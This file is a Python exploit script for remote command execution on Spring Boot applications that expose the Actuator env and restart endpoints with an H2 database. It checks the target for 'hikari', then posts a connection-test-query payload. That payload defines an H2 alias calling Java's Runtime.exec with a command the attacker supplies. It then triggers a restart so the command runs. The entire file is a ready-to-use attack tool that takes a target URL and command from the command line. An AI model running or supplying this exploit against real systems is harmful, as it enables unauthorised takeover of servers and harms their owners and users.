import requests
import sys
import json
import argparse

def check_vulnerable(url):
    env_endpoint = url
    try:
        r = requests.get(env_endpoint)
        if "hikari" in r.text:
            print("[+] {url} is vulnerable to Springboot Actuator H2 rce!".format(url=url))
        else:
            print("[!] {url} is not vulnerable to Springboot Actuator H2 rce!".format(url=url))
            sys.exit()
    except Exception as e:
        print("[!] An error occurred when accessing {url}/actuator/env".format(url=url))
        print(e)
        sys.exit()

def send_payload(url, cmd):
    exploit_endpoint = url 
    exploit_code = "CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('"+cmd+"');"
    payload = {"name":"spring.datasource.hikari.connection-test-query","value": exploit_code}
    headers = {
        "Content-Type":"application/json"
    }
    try:
        r = requests.post(exploit_endpoint, headers=headers, data=json.dumps(payload))
        print("[+] Payload sent to {url}/actuator/env".format(url=url))
    except Exception as e:
        print("[!] An error occurred when sending exploit payload to {url}/actuator/env".format(url=url))
        print(e)
        sys.exit()

def restart_actuator(url):
    exploit_endpoint = url.replace("/env", "/restart")
    headers = {
        "Content-Type":"application/json"
    }
    try:
        payload = {}
        r = requests.post(exploit_endpoint,headers=headers)
        if r.json()["message"] == "Restarting":
            print("[+] Exploit succeeded!")
        else:
            print("[*] Exploit failed!")
    except Exception as e:
        print("[!] An error occured when restarting {url}".format(url=url))
        print(e)
        sys.exit()

def exploit(url, cmd):
    check_vulnerable(url)
    send_payload(url, cmd)
    restart_actuator(url)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', help='Target url')
    parser.add_argument('--cmd', help='Exec CMD')
    args = parser.parse_args()
    exploit(args.url, args.cmd)
